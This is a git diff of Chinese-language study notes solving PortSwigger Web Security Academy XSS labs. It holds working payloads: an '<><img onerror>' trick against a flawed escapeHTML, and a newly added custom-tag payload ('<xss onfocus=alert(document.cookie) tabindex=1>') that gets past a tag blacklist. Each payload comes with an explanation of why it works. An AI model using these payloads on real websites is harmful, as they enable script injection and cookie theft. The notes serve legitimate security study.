@@ -193,6 +193,18 @@ body:'csrf='+document.querySelector('input[name=csrf]').value+'&postId=1&comment
 **攻击payload**:<><img src=1 onerror=alert(1)>
 **原理**：1.前端function escapeHTML(html) {return html.replace('<', '&lt;').replace('>', '&gt;');}这一段会将<>解析，所以要写一个空<>来占位
           2.前面解析结束后，执行后面塞入的恶意代码<img src=1 onerror=alert(1)>
+
+##关卡二十二：Reflected XSS into HTML context with all tags blocked except custom ones
+**攻击payload**:
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+**原理**：1.%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'实际上是：<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+          2.xss自定义标签，绕过黑名单
+          3.id定位
+          4.tabindex=1让自定义标签接收到信号
+          5.onfocus=alert(document.cookie)拿到焦点后执行JS
+          6.#x:页面加载后自动跳转这个id，触发focus
            
 
 
